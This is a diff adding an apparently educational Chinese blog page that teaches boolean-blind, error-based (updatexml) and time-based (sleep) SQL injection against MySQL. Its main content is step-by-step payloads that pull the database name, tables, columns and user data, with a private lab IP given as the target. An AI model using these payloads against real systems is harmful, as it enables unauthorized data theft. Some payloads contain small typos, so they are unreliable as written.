@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content>
+    <meta name="author" content="John Doe">
+    <meta name="keywords" content>
+    <title>SQL注入第二节之Boolean&amp;报错&amp;时间 ~ Willburke-blogs</title>
+    <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css?v=5.7.2">
+    <link rel="stylesheet" href="/lib/mdbootstrap/css/bootstrap.min.css?v=4.3.1">
+    <link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css?v=4.8.7">
+    <link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_l7tuu6qerl9.css">
+    
+        <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+    
+    <link rel="stylesheet" href="/css/main.css">
+
+    
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/"><strong>Willburke-blogs</strong></a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/about/">About</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2" style="background: url('/img/post.jpg')no-repeat center center;background-size: cover;">
+    <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+        <div class="container text-center white-text wow fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+            <br>
+            
+            <p>Tuesday, August 3rd 2021, 2:38 pm</p>
+            
+        </div>
+        </div>
+    </div>
+    </div>
+  </header>
+
+  <main>
+  
+  <link rel="stylesheet" href="/css/post.css">
+
+<div class="container-fluid">
+    <div class="row">
+        <div class="d-none d-md-block col-md-2"></div>
+        <div class="col-md-8 m-auto board-cntr">
+            <div class="py-5 z-depth-3 board">
+                <div class="post-content markdown-body m-auto">
+                    <h3 id="Boolean-注入攻击（盲注）"><a href="#Boolean-注入攻击（盲注）" class="headerlink" title="Boolean 注入攻击（盲注）"></a>Boolean 注入攻击（盲注）</h3><p>• 有些情况下，开发人员屏蔽了报错信息，导致攻击者无法通过报错信息进行注 入的判断。 这种情况下的注入，称为盲注。 盲注根据展现方式，分为boolean型盲注和时间型盲注。 </p>
+<p>• Boolean是基于真假的判断（true or false）; 不管输入什么，结果都只返回真或假两种情况； 通过and 1=1和and 1=2可以发现注入点。 </p>
+<p>• Boolean型盲注的关键在于通过表达式结果与已知值进行比对，根据比对结果判断正确与否。</p>
+<p>Boolean型盲注的判断方式有：  </p>
+<p>• 通过长度判断length(): length(database())&gt;=x  </p>
+<p>• 通过字符判断substr(): substr(database(),1,1) =‘s’ </p>
+<p>• 通过ascII码判断:ascii(): ascii(substr(database(),1,1)) =x </p>
+<h4 id="Boolean注入判断"><a href="#Boolean注入判断" class="headerlink" title="Boolean注入判断"></a>Boolean注入判断</h4><p>• 访问id=1’ and ‘1’=‘1   或者id=1’ and 1=1%23 （%23为‘号的url编码，或者也可以–+注释掉 后面的’号） </p>
+<p>• 访问id=1’ and ’1’=‘2  返回为no </p>
+<p>• 由此可以判断，页面只返回yes或no，而没有返回数据库中的数据，所以此处不可用union 注入</p>
+<h4 id="Boolean注入步骤"><a href="#Boolean注入步骤" class="headerlink" title="Boolean注入步骤"></a>Boolean注入步骤</h4><p>判断数据库名的长度</p>
+<p>?id=1’ and length(database())&gt;=1 –+  //这一串是构造的恶意SQL语句，也是所说的payload</p>
+<p>substr判断数据库名</p>
+<p>?id=1’ and substr(database(),1,1)=’t’ –+    //使用工具burp跑字典爆出数据库名</p>
+<p>substr判断数据库的表名</p>
+<p>?id=1’ and substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’u’ –+   //依次爆出表名</p>
+<p>substr爆字段名</p>
+<p>?id=1’ and substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 0,1),1,1)=’i’–+</p>
+<p>获取数据</p>
+<p>?id=1’ and substr((select id from test.users limit 0,1),1,1)=’1’–+</p>
+<h3 id="报错注入攻击"><a href="#报错注入攻击" class="headerlink" title="报错注入攻击"></a>报错注入攻击</h3><p>• select/insert/update/delete都可以使用报错来获取信息。 </p>
+<p>• 常用的爆错函数updatexml()，extractvalue()，floor()  </p>
+<p>• 基于函数报错的信息获取(select/insert/update/delete) </p>
+<p>• updataxml()函数是MYSQL对XML文档数据进行查询和修改的XPATH函数； </p>
+<p>• extractvalue()函数也是MYSQL对XML文档数据进行查询的XPATH函数；  </p>
+<p>• floor()函数是MYSQL中用来取整的函数。</p>
+<h4 id="报错注入步骤"><a href="#报错注入步骤" class="headerlink" title="报错注入步骤"></a>报错注入步骤</h4><p>利用函数updatexml()获取数据库</p>
+<p>• ?username=a’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+   </p>
+<p>利用函数updatexml()获取数据库</p>
+<p>• ?username=a’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+   </p>
+<p>利用函数updatexml()获取字段名</p>
+<p>• ?username=a’ and updatexml(1,concat(0x7e,(select  column_name from information_schema.columns where table_schema=’test’ and table_name=’users’  limit 1,1),0x7e),1)–+</p>
+<p>利用函数updatexml()获取值</p>
+<p>• ?username=a’ and updatexml(1,concat(0x7e,(select username from test limit1,1),0x7e),1)–+</p>
+<h3 id="时间盲注注入攻击"><a href="#时间盲注注入攻击" class="headerlink" title="时间盲注注入攻击"></a>时间盲注注入攻击</h3><p>利用sleep()或benchmark()等函数让mysql执行时间变长经常与 if(expr1,expr2,expr3)语句结合使用，通过页面的响应时间来判断条件是否 正确。if(expr1,expr2,expr3)含义是如果expr1是True,则返回expr2,否则返回 expr3。</p>
+<h4 id="时间型盲注特点："><a href="#时间型盲注特点：" class="headerlink" title="时间型盲注特点："></a>时间型盲注特点：</h4><p>• 通过时间回显的延迟作为判断</p>
+<p>• 利用sleep()或benchmark()函数延长mysql的执行时间  </p>
+<p>• 与if()搭配使用</p>
+<h4 id="时间盲注常用函数"><a href="#时间盲注常用函数" class="headerlink" title="时间盲注常用函数"></a>时间盲注常用函数</h4><p>• left(m,n) –从左向右截取字符串m返回其前n位   </p>
+<p>• substr(m,1,1) –取字符串m的左边第一位起，1字长的字符串   </p>
+<p>• ascii(m) –返回字符m的ASCII码   </p>
+<p>• if(str1,str2,str3)–如果str1正确就执行str2，否则执行str3   </p>
+<p>• sleep(m)–使程序暂停m秒   </p>
+<p>• length(m) –返回字符串m的长度 </p>
+<p>• count(column_name) –返回指定列的值的数目  </p>
+<h4 id="时间盲注步骤"><a href="#时间盲注步骤" class="headerlink" title="时间盲注步骤"></a>时间盲注步骤</h4><p>首先测试 </p>
+<p><a href="http://172.16.1.3/a/time.php/?id=1" target="_blank" rel="noopener">http://172.16.1.3/a/time.php/?id=1</a> </p>
+<p><a href="http://172.16.1.3/a/time.php/?id=1&#39;" target="_blank" rel="noopener">http://172.16.1.3/a/time.php/?id=1&#39;</a></p>
+<p>爆数据库长度</p>
+<p>?id=1 and if(length(database())&gt;10,sleep(5),1) –+ </p>
+<p>如果数据库名小于10，则马上响应，所以数据库的库名长度大于10是错误 的。通过多次尝试，可以得知数据库的长度为4</p>
+<p>使用Burp抓包并通过词典爆出数据库名</p>
+<p>?id=1 and if(substr(database(),1,1)=’a’,sleep(5),1) –+ </p>
+<p>爆出表名</p>
+<p>?id=1  and if(substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’u’,sleep(5),1)–+</p>
+<p>爆出字段名</p>
+<p>?id=1’ and if(substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 0,1),1,1)=’i’,sleep(5),1)–+</p>
+<p>爆出值</p>
+<p> ?id=1’ and if(substr((select username from test.users limit 0,1),1,1)=’q’,sleep(5),1)–+ </p>
+
+                    <hr>
+                    <div>
+                        <p>
+                        
+                        </p>
+                    </div>
+                    <br>
+                    
+                </div>
+            </div>
+        </div>
+        <div class="d-none d-md-block col-md-2">
+            
+  <div id="toc" class="py-5">
+    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>
+</div>
+
+<!-- custom -->
+
+    <div class="custom">
+    <img src="/img/good.jpg" class="rounded mx-auto d-block mt-5" style="width:440px; height:280px;">
+    </div>
+
+
+<!-- Comments -->
+<div class="comments" id="comments">
+
+</div>
+  
+  </main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank" rel="nofollow noopener"> <b>Material-T</b></a>
+    <br>
+    
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">京ICP证56489355号</a>
+      
+        <a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=C3435685" target="_blank" rel="nofollow noopener"> | 京公网安备45213656号</a>
+      
+    
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="/lib/mdbootstrap/js/jquery-3.4.1.min.js"></script>
+  <script src="/lib/mdbootstrap/js/popper.min.js"></script>
+  <script src="/lib/mdbootstrap/js/bootstrap.min.js?v=4.3.1"></script>
+  <script src="/lib/mdbootstrap/js/mdb.min.js?v=4.8.7"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="/lib/tocbot/tocbot.min.js?v=4.7.0"></script>
+    
+    <script src="/js/post.js"></script>
+  
+  
+    <script src="/lib/prettify/prettify.min.js?v=0.1.0"></script>
+    <script>
+      $(document).ready(function(){
+        $('pre').addClass('prettyprint linenums');
+        prettyPrint();
+      })
+    </script>
+  
+  
+    <script src="/lib/typed/typed.min.js?v=2.0.9"></script>
+    <script>
+        var typed = new Typed('#subtitle', {
+          strings: [
+            '  ',
+            "SQL注入第二节之Boolean&报错&时间&nbsp;",
+        ],
+        cursorChar: "_",
+        typeSpeed: 70,
+        startDelay: 300, //开始之前延迟300毫秒
+        loop: false,
+        });
+        $(".typed-cursor").addClass("h2");
+    </script>
+  
+  
+    <script src="/lib/anchor/anchor.min.js?v=4.2.0"></script>
+    <script>
+      anchors.options = {
+        placement: "right",
+        visible: "false",
+        
+      };
+      anchors.add(".post-content > h1,h2,h3,h4,h5,h6");
+    </script>
+  
+</body>
+</html>
